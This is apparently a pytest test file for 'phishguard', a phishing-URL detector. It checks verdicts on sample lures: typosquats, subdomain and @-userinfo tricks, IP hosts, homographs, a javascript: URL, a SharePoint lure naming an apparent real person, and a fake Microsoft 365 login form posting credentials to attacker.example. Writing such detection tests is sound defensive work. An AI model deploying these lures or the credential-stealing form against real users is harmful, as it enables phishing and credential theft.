from __future__ import annotations

from phishguard.engine import analyze
from phishguard.parser import parse_url


def test_official_microsoft():
    r = analyze("https://login.microsoftonline.com/")
    assert r.verdict == "official"
    assert r.official_brand == "Microsoft"
    assert r.score < 20


def test_subdomain_trap():
    r = analyze("https://login.microsoft.com.secure-auth.xyz/signin")
    assert r.verdict == "phishing"
    assert r.impersonated_brand == "Microsoft"
    codes = {f.code for f in r.findings}
    assert "domain_as_subdomain" in codes or "brand_impersonation" in codes


def test_typosquat_leet():
    r = analyze("https://micros0ft-online.com/login")
    assert r.verdict == "phishing"
    assert r.impersonated_brand == "Microsoft"


def test_at_trick():
    r = analyze("https://login.microsoftonline.com@evil.example/login")
    assert r.verdict == "phishing"
    codes = {f.code for f in r.findings}
    assert "userinfo_at" in codes
    assert r.host in {"evil.example", "evil.example."}


def test_ip_paypal():
    r = analyze("http://185.22.10.4/paypal/webscr?cmd=_login")
    assert r.verdict == "phishing"
    assert r.impersonated_brand == "PayPal"
    codes = {f.code for f in r.findings}
    assert "ip_host" in codes
    assert "plain_http" in codes


def test_user_content_gov():
    r = analyze("https://gov-gr-taxisnet.web.app/login")
    assert r.verdict == "phishing"
    assert r.impersonated_brand in {"gov.gr", None} or any(
        "gov" in (r.impersonated_brand or "").lower() for _ in [0]
    )
    codes = {f.code for f in r.findings}
    assert "user_content_host" in codes


def test_javascript_scheme():
    r = analyze("javascript:alert(1)")
    assert r.verdict == "dangerous"
    assert any(f.code == "dangerous_scheme" for f in r.findings)


def test_empty():
    r = analyze("   ")
    assert r.verdict == "invalid"


def test_punycode_homograph():
    # xn--pple-43d.com is a classic IDN example (apple lookalike)
    r = analyze("https://xn--pple-43d.com/login")
    assert any(f.code == "homograph" for f in r.findings)


def test_parse_adds_scheme():
    p = parse_url("office.com")
    assert p.scheme == "https"
    assert p.host == "office.com"


def test_cli_json_exit(tmp_path):
    from phishguard.cli import main

    assert main(["--no-probe", "https://www.microsoft.com"]) == 0
    assert main(["--no-probe", "https://login.microsoft.com.phish.xyz/"]) == 1


def test_sharepoint_lure_is_phishing():
    url = (
        "https://premierfiregr-my.sharepoint.com/personal/k_pantelides_premierfire_gr/Documents/"
        "Kimon%20Pantelides%C2%A0%20%CF%83%CE%B1%CF%82%20%CE%AD%CF%83%CF%84%CE%B5%CE%B9%CE%BB%CE%B5"
        "%20%CE%AD%CE%BD%CE%B1%20%CE%B1%CF%83%CF%86%CE%B1%CE%BB%CE%AD%CF%82%20%CE%BC%CE%AE%CE%BD%CF%85%CE%BC%CE%B1."
        "%20%CE%9A%CE%AC%CE%BD%CF%84%CE%B5%20%CE%BA%CE%BB%CE%B9%CE%BA%20%CF%83%CF%84%CE%B7%CE%BD%20"
        "%CE%B5%CF%80%CE%B9%CE%BB%CE%BF%CE%B3%CE%AE%20%CE%9B%CE%AE%CF%88%CE%B7%20%CE%B5%CE%B3%CE%B3%CF%81%CE%AC%CF%86%CE%BF%CF%85"
        "%20%CE%B3%CE%B9%CE%B1%20%CE%BD%CE%B1%20%CF%84%CE%BF%20%CE%B4%CE%B5%CE%AF%CF%84%CE%B5.pdf"
        "?e=4:NWQREU&web=1"
    )
    r = analyze(url)
    assert r.verdict == "phishing"
    assert r.score >= 80
    codes = {f.code for f in r.findings}
    assert "lure_filename" in codes
    assert "trusted_host_lure" in codes


def test_normal_sharepoint_file_is_official():
    r = analyze(
        "https://contoso-my.sharepoint.com/personal/jane_doe_contoso_com/Documents/Q3-Invoice-2026.xlsx"
    )
    assert r.verdict == "official"
    assert r.official_brand == "Microsoft"
    assert r.score < 30


def test_fake_page_on_free_host_is_not_low_risk():
    r = analyze("https://random-kit-landing.web.app/")
    assert r.score >= 30
    assert r.verdict in {"suspicious", "phishing"}


def test_href_mismatch_html():
    html = '<a href="https://evil.example/login">https://login.microsoftonline.com</a>'
    r = analyze(html)
    assert r.verdict == "phishing"
    assert any(f.code == "href_mismatch" for f in r.findings)


def test_fake_html_login_kit_is_phishing(monkeypatch):
    fake = """
    <html><head><title>Microsoft 365 Sign in</title></head>
    <body>
      <form action="https://attacker.example/steal">
        <input type="email" name="loginfmt">
        <input type="password" name="passwd">
      </form>
    </body></html>
    """
    monkeypatch.setattr("phishguard.engine.fetch_html", lambda url: (fake, None, 200))
    r = analyze("https://random-unlisted-site.example/owa/", probe=True)
    assert r.verdict == "phishing"
    assert r.score >= 85
    codes = {f.code for f in r.findings}
    assert "password_form" in codes
    assert "brand_in_page" in codes
